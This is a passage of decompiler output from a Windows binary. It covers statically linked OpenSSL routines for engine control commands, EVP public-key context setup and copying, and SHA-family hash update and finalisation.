    a1[14] = BYTE1(v21);
    a1[15] = v21;
    v23 = a2[4];
    v24 = a2[5];
    a1[16] = HIBYTE(v24);
    a1[17] = BYTE2(v24);
    a1[18] = BYTE1(v24);
    a1[19] = v24;
    a1[20] = HIBYTE(v23);
    a1[21] = BYTE2(v23);
    a1[22] = BYTE1(v23);
    a1[23] = v23;
    v25 = a2[6];
    v26 = a2[7];
    a1[24] = HIBYTE(v26);
    a1[25] = BYTE2(v26);
    a1[26] = BYTE1(v26);
    a1[27] = v26;
    a1[28] = HIBYTE(v25);
    a1[29] = BYTE2(v25);
    a1[30] = BYTE1(v25);
    a1[31] = v25;
    v27 = a2[8];
    v28 = a2[9];
    a1[32] = HIBYTE(v28);
    a1[33] = BYTE2(v28);
    a1[34] = BYTE1(v28);
    a1[35] = v28;
    a1[36] = HIBYTE(v27);
    a1[37] = BYTE2(v27);
    a1[38] = BYTE1(v27);
    a1[39] = v27;
    v29 = a2[10];
    v30 = a2[11];
    a1[40] = HIBYTE(v30);
    a1[41] = BYTE2(v30);
    a1[42] = BYTE1(v30);
    a1[43] = v30;
    a1[44] = HIBYTE(v29);
    a1[45] = BYTE2(v29);
    a1[46] = BYTE1(v29);
    a1[47] = v29;
    return 1;
  }
  else
  {
    if ( v7 != 64 )
      return 0;
    v8 = a2 + 4;
    v9 = 2;
    do
    {
      v10 = *(v8 - 3);
      v11 = *(v8 - 4);
      v12 = v5 + 1;
      *(v12 - 1) = HIBYTE(v10);
      v12 += 2;
      *(v12 - 2) = BYTE2(v10);
      *(v12++ - 1) = BYTE1(v10);
      *(v12 - 1) = v10;
      *v12++ = HIBYTE(v11);
      *v12 = BYTE2(v11);
      v12 += 2;
      *(v12 - 1) = BYTE1(v11);
      *v12 = v11;
      v13 = *(v8 - 2);
      ++v12;
      v14 = *(v8 - 1);
      *v12++ = HIBYTE(v14);
      *v12++ = BYTE2(v14);
      *v12++ = BYTE1(v14);
      *v12++ = v14;
      *v12 = HIBYTE(v13);
      *++v12 = BYTE2(v13);
      v12[1] = BYTE1(v13);
      v12 += 2;
      *v12 = v13;
      v15 = *v8;
      v16 = v8[1];
      *++v12 = HIBYTE(v16);
      *++v12 = BYTE2(v16);
      v12 += 2;
      *(v12++ - 1) = BYTE1(v16);
      *(v12 - 1) = v16;
      *v12++ = HIBYTE(v15);
      *v12 = BYTE2(v15);
      v12 += 2;
      *(v12 - 1) = BYTE1(v15);
      *v12 = v15;
      v17 = v8[2];
      ++v12;
      v18 = v8[3];
      *v12++ = HIBYTE(v18);
      *v12++ = BYTE2(v18);
      *v12++ = BYTE1(v18);
      *v12++ = v18;
      *v12++ = HIBYTE(v17);
      *v12++ = BYTE2(v17);
      *v12++ = BYTE1(v17);
      *v12 = v17;
      v5 = v12 + 1;
      v8 += 8;
      --v9;
    }
    while ( v9 );
    return 1;
  }
}

//----- (00443280) --------------------------------------------------------
int __cdecl sub_443280(int a1, char *Src, size_t Size)
{
  size_t v3; // edi
  char *v4; // ebp
  unsigned int v5; // ecx
  unsigned int v6; // ebx
  unsigned __int64 v7; // rax
  size_t v8; // ebx
  char *v9; // eax
  char *v11; // ebx
  char *v12; // ebx

  v3 = Size;
  v4 = (char *)(a1 + 80);
  if ( Size )
  {
    v5 = *(_DWORD *)(a1 + 68);
    v6 = *(_DWORD *)(a1 + 64);
    v7 = __PAIR64__(v5, v6) + 8i64 * Size;
    if ( v7 < __PAIR64__(v5, v6) )
      ++*(_QWORD *)(a1 + 72);
    *(_DWORD *)(a1 + 64) = v7;
    LODWORD(v7) = *(_DWORD *)(a1 + 208);
    *(_DWORD *)(a1 + 68) = HIDWORD(v7);
    if ( (_DWORD)v7 )
    {
      v8 = 128 - v7;
      v9 = &v4[v7];
      if ( Size < v8 )
      {
        memcpy(v9, Src, Size);
        *(_DWORD *)(a1 + 208) += Size;
        return 1;
      }
      memcpy(v9, Src, v8);
      v3 = Size - v8;
      *(_DWORD *)(a1 + 208) = 0;
      v11 = &Src[v8];
      sub_462CC0();
    }
    else
    {
      v11 = Src;
    }
    if ( v3 >= 0x80 )
    {
      sub_462CC0();
      v12 = &v11[v3];
      v3 &= 0x7Fu;
      v11 = &v12[-v3];
    }
    if ( v3 )
    {
      memcpy(v4, v11, v3);
      *(_DWORD *)(a1 + 208) = v3;
    }
  }
  return 1;
}

//----- (00443370) --------------------------------------------------------
BOOL __cdecl sub_443370(_DWORD *a1)
{
  return !*a1 || !a1[1];
}

//----- (00443390) --------------------------------------------------------
int __usercall sub_443390@<eax>(_DWORD *a1@<ecx>, const char *a2@<edi>)
{
  int result; // eax
  const char *v4; // ecx

  for ( result = 0; ; ++result )
  {
    if ( !*a1 )
      return -1;
    v4 = (const char *)a1[1];
    if ( !v4 || !strcmp(v4, a2) )
      break;
    a1 += 4;
  }
  if ( !*a1 || !a1[1] )
    return -1;
  return result;
}

//----- (004433F0) --------------------------------------------------------
unsigned int __fastcall sub_4433F0(const char *a1, int a2, int a3, unsigned int a4)
{
  _DWORD *v6; // eax
  unsigned int result; // eax
  int v8; // esi
  int v9; // eax
  int v10; // edx
  unsigned int *v11; // ecx
  int i; // eax
  unsigned int v13; // esi
  bool v14; // zf
  int v15; // ecx
  const char *v16; // eax
  unsigned int v17; // ecx
  const char *v18; // eax

  if ( a2 == 11 )
  {
    v6 = *(_DWORD **)(a3 + 72);
    if ( v6 && *v6 && v6[1] )
      return *v6;
    else
      return 0;
  }
  if ( (a2 == 13 || a2 == 15 || a2 == 17) && !a1 )
  {
    sub_408310(38, 172, 67, (int)"crypto\\engine\\eng_ctrl.c", 77);
    return -1;
  }
  if ( a2 == 13 )
  {
    v8 = *(_DWORD *)(a3 + 72);
    if ( v8 )
    {
      v9 = sub_443390(*(_DWORD **)(a3 + 72), a1);
      if ( v9 >= 0 )
        return *(_DWORD *)(16 * v9 + v8);
    }
    sub_408310(38, 172, 137, (int)"crypto\\engine\\eng_ctrl.c", 85);
    return -1;
  }
  v10 = *(_DWORD *)(a3 + 72);
  if ( !v10 )
    goto LABEL_41;
  v11 = *(unsigned int **)(a3 + 72);
  for ( i = 0; ; ++i )
  {
    v13 = *v11;
    if ( !*v11 || !v11[1] )
      break;
    v14 = v13 == a4;
    if ( v13 >= a4 )
      goto LABEL_24;
    v11 += 4;
  }
  v14 = v13 == a4;
LABEL_24:
  if ( !v14 || i < 0 )
  {
LABEL_41:
    sub_408310(38, 172, 138, (int)"crypto\\engine\\eng_ctrl.c", 97);
    return -1;
  }
  switch ( a2 )
  {
    case 12:
      if ( sub_443370((_DWORD *)(16 * (i + 1) + v10)) )
        return 0;
      else
        return *(_DWORD *)v15;
    case 14:
      return strlen(*(const char **)(16 * i + v10 + 4));
    case 15:
      v16 = *(const char **)(16 * i + v10 + 4);
      v17 = strlen(v16);
      goto LABEL_37;
    case 16:
      v18 = *(const char **)(16 * i + v10 + 8);
      if ( v18 )
        return strlen(v18);
      else
        return strlen((const char *)off_53169C);
    case 17:
      v16 = *(const char **)(16 * i + v10 + 8);
      if ( v16 )
      {
        v17 = strlen(v16);
LABEL_37:
        result = sub_4191B0((int)a1, v17 + 1, "%s", (int)v16);
      }
      else
      {
        result = sub_4191B0((int)a1, strlen((const char *)off_53169C) + 1, "%s", (int)off_53169C);
      }
      break;
    case 18:
      return *(_DWORD *)(16 * i + v10 + 12);
    default:
      sub_408310(38, 172, 110, (int)"crypto\\engine\\eng_ctrl.c", 129);
      return -1;
  }
  return result;
}
// 4434EB: variable 'v15' is possibly undefined
// 53169C: using guessed type char (*off_53169C)[3];

//----- (00443620) --------------------------------------------------------
unsigned int __cdecl sub_443620(int a1, int a2, unsigned int a3, const char *a4, int a5)
{
  unsigned int result; // eax
  BOOL v6; // edi
  int (__cdecl *v7)(int, int, unsigned int, const char *, int); // ecx

  if ( !a1 )
  {
    sub_408310(38, 142, 67, (int)"crypto\\engine\\eng_ctrl.c", 137);
    return 0;
  }
  sub_414690(dword_73C6C0);
  v6 = *(_DWORD *)(a1 + 80) > 0;
  sub_4146B0(dword_73C6C0);
  v7 = *(int (__cdecl **)(int, int, unsigned int, const char *, int))(a1 + 56);
  result = v7 != 0;
  if ( !v6 )
  {
    sub_408310(38, 142, 130, (int)"crypto\\engine\\eng_ctrl.c", 145);
    return 0;
  }
  if ( a2 != 10 )
  {
    if ( a2 <= 10 || a2 > 18 )
    {
      if ( !v7 )
      {
        sub_408310(38, 142, 120, (int)"crypto\\engine\\eng_ctrl.c", 179);
        return 0;
      }
    }
    else
    {
      if ( !v7 )
      {
        sub_408310(38, 142, 120, (int)"crypto\\engine\\eng_ctrl.c", 166);
        return -1;
      }
      if ( (*(_BYTE *)(a1 + 76) & 2) == 0 )
        return sub_4433F0(a4, a2, a1, a3);
    }
    return v7(a1, a2, a3, a4, a5);
  }
  return result;
}

//----- (00443730) --------------------------------------------------------
BOOL __cdecl sub_443730(int a1, unsigned int a2)
{
  signed int v2; // eax

  v2 = sub_443620(a1, 18, a2, 0, 0);
  if ( v2 < 0 )
  {
    sub_408310(38, 170, 138, (int)"crypto\\engine\\eng_ctrl.c", 191);
    return 0;
  }
  return (v2 & 7) != 0;
}

//----- (00443780) --------------------------------------------------------
BOOL __cdecl sub_443780(char *EndPtr, const char *a2, char *String, int a4)
{
  char *v4; // edi
  int v5; // eax
  unsigned int v6; // esi
  signed int v7; // eax
  char *v9; // ebx
  int v10; // eax

  v4 = EndPtr;
  if ( EndPtr && a2 )
  {
    if ( !*((_DWORD *)EndPtr + 14) || (v5 = sub_443620((int)EndPtr, 13, 0, a2, 0), v6 = v5, v5 <= 0) )
    {
      if ( a4 )
      {
        sub_408400();
        return 1;
      }
      sub_408310(38, 171, 137, (int)"crypto\\engine\\eng_ctrl.c", 263);
      return 0;
    }
    if ( !sub_443730((int)v4, v5) )
    {
      sub_408310(38, 171, 134, (int)"crypto\\engine\\eng_ctrl.c", 268);
      return 0;
    }
    v7 = sub_443620((int)v4, 18, v6, 0, 0);
    if ( v7 < 0 )
    {
      sub_408310(38, 171, 110, (int)"crypto\\engine\\eng_ctrl.c", 279);
      return 0;
    }
    if ( (v7 & 4) != 0 )
    {
      if ( !String )
        return (int)sub_443620((int)v4, v6, 0, 0, 0) > 0;
      sub_408310(38, 171, 136, (int)"crypto\\engine\\eng_ctrl.c", 288);
      return 0;
    }
    v9 = String;
    if ( String )
    {
      if ( (v7 & 2) != 0 )
        return (int)sub_443620((int)v4, v6, 0, String, 0) > 0;
      if ( (v7 & 1) != 0 )
      {
        v10 = strtol(String, &EndPtr, 10);
        if ( v9 != EndPtr && !*EndPtr )
          return (int)sub_443620((int)v4, v6, v10, 0, 0) > 0;
        sub_408310(38, 171, 133, (int)"crypto\\engine\\eng_ctrl.c", 328);
      }
      else
      {
        sub_408310(38, 171, 110, (int)"crypto\\engine\\eng_ctrl.c", 322);
      }
    }
    else
    {
      sub_408310(38, 171, 135, (int)"crypto\\engine\\eng_ctrl.c", 304);
    }
    return 0;
  }
  else
  {
    sub_408310(38, 171, 67, (int)"crypto\\engine\\eng_ctrl.c", 245);
    return 0;
  }
}

//----- (00443960) --------------------------------------------------------
int __cdecl sub_443960(int a1)
{
  int v1; // eax
  int result; // eax
  int *v3; // eax
  int *v4; // [esp+0h] [ebp-70h] BYREF
  int v5[27]; // [esp+4h] [ebp-6Ch] BYREF

  v4 = v5;
  v5[0] = a1;
  if ( dword_539220 )
  {
    v1 = sub_426BE0(dword_539220, (int)v5);
    if ( v1 >= 0 )
      return sub_426A40((int *)dword_539220, v1);
  }
  v3 = (int *)sub_423650((int)&v4, (int)&off_5316A0, 10, 4, (int (__cdecl *)(int, int))sub_443940);
  if ( !v3 )
    return 0;
  result = *v3;
  if ( !result )
    return 0;
  return result;
}
// 443940: using guessed type int sub_443940();
// 5316A0: using guessed type void *off_5316A0;
// 539220: using guessed type int dword_539220;

//----- (004439E0) --------------------------------------------------------
void __cdecl sub_4439E0(void *Block)
{
  if ( Block )
  {
    if ( (*((_BYTE *)Block + 4) & 1) != 0 )
      sub_413490(Block);
  }
}

//----- (00443A10) --------------------------------------------------------
void __cdecl sub_443A10(volatile LONG **Block)
{
  void (__cdecl *v1)(volatile LONG **); // eax

  if ( Block )
  {
    if ( *Block )
    {
      v1 = (void (__cdecl *)(volatile LONG **))*((_DWORD *)*Block + 4);
      if ( v1 )
        v1(Block);
    }
    sub_41CEB0(Block[2]);
    sub_41CEB0(Block[3]);
    sub_4162A0(Block[1]);
    sub_413490(Block);
  }
}

//----- (00443A60) --------------------------------------------------------
int __cdecl sub_443A60(int a1, int a2, int a3, int a4, int a5, int a6)
{
  _DWORD *v6; // eax
  int (__cdecl *v7)(int, int, int, int); // esi
  int v8; // eax
  int v10; // esi

  if ( a1 && (v6 = *(_DWORD **)a1) != 0 && (v7 = (int (__cdecl *)(int, int, int, int))v6[25]) != 0 )
  {
    if ( a2 != -1 && *v6 != a2 )
      return -1;
    v8 = *(_DWORD *)(a1 + 16);
    if ( !v8 )
    {
      sub_408310(6, 137, 149, (int)"crypto\\evp\\pmeth_lib.c", 305);
      return -1;
    }
    if ( a3 == -1 || (v8 & a3) != 0 )
    {
      v10 = v7(a1, a4, a5, a6);
      if ( v10 == -2 )
        sub_408310(6, 137, 147, (int)"crypto\\evp\\pmeth_lib.c", 317);
      return v10;
    }
    else
    {
      sub_408310(6, 137, 148, (int)"crypto\\evp\\pmeth_lib.c", 310);
      return -1;
    }
  }
  else
  {
    sub_408310(6, 137, 147, (int)"crypto\\evp\\pmeth_lib.c", 298);
    return -2;
  }
}

//----- (00443B50) --------------------------------------------------------
int __cdecl sub_443B50(int a1, int a2, const char *a3)
{
  unsigned int v3; // eax

  v3 = strlen(a3);
  if ( v3 <= 0x7FFFFFFF )
    return (*(int (__cdecl **)(int, int, unsigned int, const char *))(*(_DWORD *)a1 + 100))(a1, a2, v3, a3);
  else
    return -1;
}

//----- (00443B90) --------------------------------------------------------
void *__cdecl sub_443B90(int a1, int a2, const char *a3)
{
  void *result; // eax
  void *v4; // esi
  int v5; // edi
  int v6; // [esp+8h] [ebp-4h] BYREF

  result = sub_424A20(a3, &v6);
  v4 = result;
  if ( result )
  {
    v5 = (*(int (__cdecl **)(int, int, int, void *))(*(_DWORD *)a1 + 100))(a1, a2, v6, result);
    sub_413490(v4);
    return (void *)v5;
  }
  return result;
}

//----- (00443C00) --------------------------------------------------------
volatile LONG **__usercall sub_443C00@<eax>(int a1@<ecx>, int a2@<ebx>, volatile LONG *a3)
{
  int v4; // esi
  int *v5; // eax
  int v7; // eax
  int v8; // edi
  volatile LONG **v9; // eax
  volatile LONG **v10; // esi
  int (__cdecl *v11)(volatile LONG **); // edi

  v4 = a1;
  if ( a1 == -1 )
  {
    if ( !a2 )
      return 0;
    v5 = *(int **)(a2 + 12);
    if ( !v5 )
      return 0;
    v4 = *v5;
  }
  if ( a2 && *(_DWORD *)(a2 + 16) )
    a3 = *(volatile LONG **)(a2 + 16);
  if ( a3 )
  {
    if ( !sub_416200(a3) )
    {
      sub_408310(6, 157, 38, (int)"crypto\\evp\\pmeth_lib.c", 97);
      return 0;
    }
  }
  else
  {
    a3 = sub_442BC0(v4);
  }
  if ( a3 )
    v7 = sub_442C50((int)a3, v4);
  else
    v7 = sub_443960(v4);
  v8 = v7;
  if ( v7 )
  {
    v9 = (volatile LONG **)sub_413430(0x28u);
    v10 = v9;
    if ( v9 )
    {
      v9[1] = a3;
      *v9 = (volatile LONG *)v8;
      v9[4] = 0;
      v9[2] = (volatile LONG *)a2;
      if ( a2 )
        sub_41CB90(a2);
      v11 = *(int (__cdecl **)(volatile LONG **))(v8 + 8);
      if ( v11 && v11(v10) <= 0 )
      {
        sub_443A10(v10);
        return 0;
      }
      else
      {
        return v10;
      }
    }
    else
    {
      sub_4162A0(a3);
      sub_408310(6, 157, 65, (int)"crypto\\evp\\pmeth_lib.c", 124);
      return 0;
    }
  }
  else
  {
    sub_408310(6, 157, 156, (int)"crypto\\evp\\pmeth_lib.c", 115);
    return 0;
  }
}

//----- (00443D20) --------------------------------------------------------
volatile LONG **__cdecl sub_443D20(int a1, volatile LONG *a2)
{
  int *v3; // eax
  int v4; // esi
  int v6; // eax
  int v7; // edi
  volatile LONG **v8; // eax
  volatile LONG **v9; // esi
  int (__cdecl *v10)(volatile LONG **); // edi

  if ( !a1 )
    return 0;
  v3 = *(int **)(a1 + 12);
  if ( !v3 )
    return 0;
  v4 = *v3;
  if ( *(_DWORD *)(a1 + 16) )
    a2 = *(volatile LONG **)(a1 + 16);
  if ( a2 )
  {
    if ( !sub_416200(a2) )
    {
      sub_408310(6, 157, 38, (int)"crypto\\evp\\pmeth_lib.c", 97);
      return 0;
    }
  }
  else
  {
    a2 = sub_442BC0(v4);
  }
  if ( a2 )
    v6 = sub_442C50((int)a2, v4);
  else
    v6 = sub_443960(v4);
  v7 = v6;
  if ( v6 )
  {
    v8 = (volatile LONG **)sub_413430(0x28u);
    v9 = v8;
    if ( v8 )
    {
      v8[1] = a2;
      *v8 = (volatile LONG *)v7;
      v8[4] = 0;
      v8[2] = (volatile LONG *)a1;
      sub_41CB90(a1);
      v10 = *(int (__cdecl **)(volatile LONG **))(v7 + 8);
      if ( v10 && v10(v9) <= 0 )
      {
        sub_443A10(v9);
        return 0;
      }
      else
      {
        return v9;
      }
    }
    else
    {
      sub_4162A0(a2);
      sub_408310(6, 157, 65, (int)"crypto\\evp\\pmeth_lib.c", 124);
      return 0;
    }
  }
  else
  {
    sub_408310(6, 157, 156, (int)"crypto\\evp\\pmeth_lib.c", 115);
    return 0;
  }
}

//----- (00443E40) --------------------------------------------------------
volatile LONG **__cdecl sub_443E40(int a1, volatile LONG *a2)
{
  return sub_443C00(a1, 0, a2);
}

//----- (00443E60) --------------------------------------------------------
volatile LONG **__cdecl sub_443E60(volatile LONG **a1)
{
  volatile LONG **v2; // eax
  volatile LONG **v3; // edi

  if ( !*a1 || !*((_DWORD *)*a1 + 3) )
    return 0;
  if ( a1[1] && !sub_416200(a1[1]) )
  {
    sub_408310(6, 156, 38, (int)"crypto\\evp\\pmeth_lib.c", 231);
    return 0;
  }
  v2 = (volatile LONG **)sub_4133F0(0x28u);
  v3 = v2;
  if ( v2 )
  {
    *v2 = *a1;
    v2[1] = a1[1];
    if ( a1[2] )
      sub_41CB90((int)a1[2]);
    v3[2] = a1[2];
    if ( a1[3] )
      sub_41CB90((int)a1[3]);
    v3[3] = a1[3];
    v3[5] = 0;
    v3[6] = 0;
    v3[4] = a1[4];
    if ( (*((int (__cdecl **)(volatile LONG **, volatile LONG **))*a1 + 3))(v3, a1) > 0 )
      return v3;
    sub_443A10(v3);
  }
  return 0;
}

//----- (00443F40) --------------------------------------------------------
int __cdecl sub_443F40(int *a1)
{
  int *v1; // esi
  int (__cdecl *v2)(int *, _DWORD, int **, _DWORD); // eax
  int v3; // eax

  v1 = a1;
  v2 = (int (__cdecl *)(int *, _DWORD, int **, _DWORD))a1[8];
  if ( v2 && (v3 = v2(a1, 0, &a1, 0), v3 > 0) )
    return sub_42AC30(dword_539224, (int)sub_443F30, v1, a1, v3, 0);
  else
    return 1;
}
// 443F30: using guessed type int sub_443F30();
// 539224: using guessed type int dword_539224[16];

//----- (00443F90) --------------------------------------------------------
int __cdecl sub_443F90(int *a1)
{
  int *v1; // esi
  int (__cdecl *v2)(int *, _DWORD, int **, _DWORD); // eax
  int v3; // eax

  v1 = a1;
  v2 = (int (__cdecl *)(int *, _DWORD, int **, _DWORD))a1[8];
  if ( v2 && (v3 = v2(a1, 0, &a1, 0), v3 > 0) )
    return sub_42AC30((int *)&stru_539224, (int)sub_443F30, v1, a1, v3, 1);
  else
    return 1;
}
// 443F30: using guessed type int sub_443F30();

//----- (00443FE0) --------------------------------------------------------
_DWORD *__cdecl sub_443FE0(int a1)
{
  return sub_42AE50((int *)&stru_539224, a1);
}

//----- (00444000) --------------------------------------------------------
int __cdecl sub_444000(int a1, int a2)
{
  *(_DWORD *)(a1 + 32) = a2;
  return 1;
}

//----- (00444020) --------------------------------------------------------
int __cdecl sub_444020(int a1, int a2)
{
  int (__cdecl *v2)(int, int *, _DWORD, int); // eax

  v2 = *(int (__cdecl **)(int, int *, _DWORD, int))(a1 + 32);
  if ( v2 && v2(a1, &a1, 0, a2) )
    return a1;
  sub_408310(38, 186, 147, (int)"crypto\\engine\\tb_digest.c", 74);
  return 0;
}

//----- (00444070) --------------------------------------------------------
int __cdecl sub_444070(int a1, const __m128i *Src, size_t Size)
{
  size_t v3; // edi
  const __m128i *v4; // ebp
  size_t v5; // eax
  size_t v6; // ecx
  int v7; // eax
  int v8; // ebp
  int v10; // ebx
  size_t v11; // ebx

  v3 = Size;
  v4 = Src;
  if ( Size )
  {
    v5 = *(_DWORD *)(a1 + 20);
    v6 = v5 + 8 * Size;
    if ( v6 < v5 )
      ++*(_DWORD *)(a1 + 24);
    *(_DWORD *)(a1 + 24) += Size >> 29;
    v7 = *(_DWORD *)(a1 + 92);
    *(_DWORD *)(a1 + 20) = v6;
    if ( v7 )
    {
      v8 = a1 + 28;
      if ( Size < 0x40 && v7 + Size < 0x40 )
      {
        memcpy((void *)(v7 + v8), Src, Size);
        *(_DWORD *)(a1 + 92) += Size;
        return 1;
      }
      v10 = 64 - v7;
      memcpy((void *)(v7 + v8), Src, 64 - v7);
      sub_469500((__m128i *)a1, (const __m128i *)(a1 + 28), 1);
      v3 = Size - v10;
      *(_DWORD *)(a1 + 92) = 0;
      memset((void *)(a1 + 28), 0, 0x40u);
      v4 = (const __m128i *)((char *)Src + v10);
    }
    if ( v3 >> 6 )
    {
      sub_469500((__m128i *)a1, v4, v3 >> 6);
      v11 = v3 >> 6 << 6;
      v4 = (const __m128i *)((char *)v4 + v11);
      v3 -= v11;
    }
    if ( v3 )
    {
      *(_DWORD *)(a1 + 92) = v3;
      memcpy((void *)(a1 + 28), v4, v3);
    }
  }
  return 1;
}

//----- (00444150) --------------------------------------------------------
int __cdecl sub_444150(_BYTE *a1, int *a2)
{
  int v2; // ebx
  const __m128i *v3; // esi
  unsigned int v4; // ebx
  int v5; // ecx
  int v6; // ecx
  int v7; // ecx
  int v8; // ecx
  int v9; // ecx

  v2 = a2[23];
  v3 = (const __m128i *)(a2 + 7);
  *((_BYTE *)a2 + v2 + 28) = 0x80;
  v4 = v2 + 1;
  if ( v4 > 0x38 )
  {
    memset(&v3->m128i_i8[v4], 0, 64 - v4);
    v4 = 0;
    sub_469500((__m128i *)a2, v3, 1);
  }
  memset(&v3->m128i_i8[v4], 0, 56 - v4);
  *((_BYTE *)a2 + 84) = *((_BYTE *)a2 + 27);
  *((_BYTE *)a2 + 85) = *((_BYTE *)a2 + 26);
  *((_BYTE *)a2 + 86) = *((_BYTE *)a2 + 25);
  *((_BYTE *)a2 + 87) = *((_BYTE *)a2 + 24);
  *((_BYTE *)a2 + 88) = *((_BYTE *)a2 + 23);
  *((_BYTE *)a2 + 89) = *((_BYTE *)a2 + 22);
  *((_BYTE *)a2 + 90) = *((_BYTE *)a2 + 21);
  *((_BYTE *)a2 + 91) = *((_BYTE *)a2 + 20);
  sub_469500((__m128i *)a2, (const __m128i *)(a2 + 7), 1);
  a2[23] = 0;
  sub_4139E0((_BYTE *)a2 + 28, 0x40u);
  v5 = *a2;
  *a1 = HIBYTE(*a2);
  a1[1] = BYTE2(v5);
  a1[2] = BYTE1(v5);
  a1[3] = v5;
  v6 = a2[1];
  a1[4] = HIBYTE(v6);
  a1[5] = BYTE2(v6);
  a1[6] = BYTE1(v6);
  a1[7] = v6;
  v7 = a2[2];
  a1[8] = HIBYTE(v7);
  a1[9] = BYTE2(v7);
  a1[10] = BYTE1(v7);
  a1[11] = v7;
  v8 = a2[3];
  a1[12] = HIBYTE(v8);
  a1[13] = BYTE2(v8);
  a1[14] = BYTE1(v8);
  a1[15] = v8;
  v9 = a2[4];
  a1[16] = HIBYTE(v9);
  a1[17] = BYTE2(v9);
  a1[18] = BYTE1(v9);
  a1[19] = v9;
  return 1;
}

//----- (00444360) --------------------------------------------------------
int __cdecl sub_444360(_DWORD *a1, char *Src, size_t Size)
{
  size_t v3; // edi
  char *v4; // ebp
  size_t v5; // eax
  size_t v6; // ecx
  int v7; // eax
  _DWORD *v8; // ebp
  int v10; // ebx
  size_t v11; // ebx

  v3 = Size;
  v4 = Src;
  if ( Size )
  {
    v5 = a1[8];
    v6 = v5 + 8 * Size;
    if ( v6 < v5 )
      ++a1[9];
    a1[9] += Size >> 29;
    v7 = a1[26];
    a1[8] = v6;
    if ( v7 )
    {
      v8 = a1 + 10;
      if ( Size < 0x40 && v7 + Size < 0x40 )
      {
        memcpy((char *)v8 + v7, Src, Size);
        a1[26] += Size;
        return 1;
      }
      v10 = 64 - v7;
      memcpy((char *)v8 + v7, Src, 64 - v7);
      sub_46C540();
      v3 = Size - v10;
      a1[26] = 0;
      memset(a1 + 10, 0, 0x40u);
      v4 = &Src[v10];
    }
    if ( v3 >> 6 )
    {
      sub_46C540();
      v11 = v3 >> 6 << 6;
      v4 += v11;
      v3 -= v11;
    }
    if ( v3 )
    {
      a1[26] = v3;
      memcpy(a1 + 10, v4, v3);
    }
  }
  return 1;
}

//----- (00444440) --------------------------------------------------------
int __cdecl sub_444440(_BYTE *a1, int *a2)
{
  int v2; // ebx
  int *v3; // edi
  unsigned int v4; // ebx
  unsigned int v5; // eax
  unsigned int v7; // edi
  _BYTE *v8; // eax
  int v9; // ecx
  _BYTE *v10; // eax
  int v11; // ecx
  int v12; // ecx
  int v13; // ecx
  int v14; // ecx
  int v15; // ecx
  int v16; // ecx
  int v17; // ecx
  _BYTE *v18; // eax
  int v19; // ecx
  int v20; // ecx
  int v21; // ecx
  int v22; // ecx
  int v23; // ecx
  int v24; // ecx
  int v25; // ecx
  _BYTE *v26; // eax

  v2 = a2[26];
  v3 = a2 + 10;
  *((_BYTE *)a2 + v2 + 40) = 0x80;
  v4 = v2 + 1;
  if ( v4 > 0x38 )
  {
    memset((char *)v3 + v4, 0, 64 - v4);
    v4 = 0;
    sub_46C540();
  }
  memset((char *)v3 + v4, 0, 56 - v4);
  *((_BYTE *)a2 + 96) = *((_BYTE *)a2 + 39);
  *((_BYTE *)a2 + 97) = *((_BYTE *)a2 + 38);
  *((_BYTE *)a2 + 98) = *((_BYTE *)a2 + 37);
  *((_BYTE *)a2 + 99) = *((_BYTE *)a2 + 36);
  *((_BYTE *)a2 + 100) = *((_BYTE *)a2 + 35);
  *((_BYTE *)a2 + 101) = *((_BYTE *)a2 + 34);
  *((_BYTE *)a2 + 102) = *((_BYTE *)a2 + 33);
  *((_BYTE *)a2 + 103) = *((_BYTE *)a2 + 32);
  sub_46C540();
  a2[26] = 0;
  sub_4139E0((_BYTE *)a2 + 40, 0x40u);
  v5 = a2[27];
  if ( v5 == 28 )
  {
    v20 = *a2;
    *a1 = HIBYTE(*a2);
    a1[1] = BYTE2(v20);
    a1[2] = BYTE1(v20);
    a1[3] = v20;
    v21 = a2[1];
    a1[4] = HIBYTE(v21);
    a1[5] = BYTE2(v21);
    a1[6] = BYTE1(v21);
    a1[7] = v21;
    v22 = a2[2];
    a1[8] = HIBYTE(v22);
    a1[9] = BYTE2(v22);
    a1[10] = BYTE1(v22);
    a1[11] = v22;
    v23 = a2[3];
    a1[12] = HIBYTE(v23);
    a1[13] = BYTE2(v23);
    a1[14] = BYTE1(v23);
    a1[15] = v23;
    v24 = a2[4];
    a1[16] = HIBYTE(v24);
    a1[17] = BYTE2(v24);
    a1[18] = BYTE1(v24);
    a1[19] = v24;
    v25 = a2[5];
    a1[20] = HIBYTE(v25);
    a1[21] = BYTE2(v25);
    a1[22] = BYTE1(v25);
    v18 = a1 + 23;
    a1[23] = v25;
    v19 = a2[6];
    goto LABEL_13;
  }
  if ( v5 == 32 )
  {
    v11 = *a2;
    *a1 = HIBYTE(*a2);
    a1[1] = BYTE2(v11);
    a1[2] = BYTE1(v11);
    a1[3] = v11;
    v12 = a2[1];
    a1[4] = HIBYTE(v12);
    a1[5] = BYTE2(v12);
    a1[6] = BYTE1(v12);
    a1[7] = v12;
    v13 = a2[2];
    a1[8] = HIBYTE(v13);
    a1[9] = BYTE2(v13);
    a1[10] = BYTE1(v13);
    a1[11] = v13;
    v14 = a2[3];
    a1[12] = HIBYTE(v14);
    a1[13] = BYTE2(v14);
    a1[14] = BYTE1(v14);
    a1[15] = v14;
    v15 = a2[4];
    a1[16] = HIBYTE(v15);
    a1[17] = BYTE2(v15);
    a1[18] = BYTE1(v15);
    a1[19] = v15;
    v16 = a2[5];
    a1[20] = HIBYTE(v16);
    a1[21] = BYTE2(v16);
    a1[22] = BYTE1(v16);
    a1[23] = v16;
    v17 = a2[6];
    a1[24] = HIBYTE(v17);
    a1[25] = BYTE2(v17);
    a1[26] = BYTE1(v17);
    v18 = a1 + 27;
    a1[27] = v17;
    v19 = a2[7];
LABEL_13:
    v26 = v18 + 1;
    *v26++ = HIBYTE(v19);
    *v26++ = BYTE2(v19);
    *v26 = BYTE1(v19);
    v26[1] = v19;
    return 1;
  }
  if ( v5 > 0x20 )
    return 0;
  v7 = 0;
  if ( (v5 & 0xFFFFFFFC) == 0 )
    return 1;
  v8 = a1;
  do
  {
    v9 = a2[v7];
    *v8 = HIBYTE(v9);
    v10 = v8 + 1;
    *v10++ = BYTE2(v9);
    *v10++ = BYTE1(v9);
    *v10 = v9;
    ++v7;
    v8 = v10 + 1;
  }
  while ( v7 < (unsigned int)a2[27] >> 2 );
  return 1;
}

//----- (00444720) --------------------------------------------------------
_DWORD *sub_444720()
{
  _DWORD *result; // eax
  _DWORD *v1; // esi

  result = sub_42C010();
  v1 = result;
  if ( result && *result )
  {
    if ( result[1] )
    {
      result = (_DWORD *)ConvertFiberToThread();
      *v1 = 0;
    }
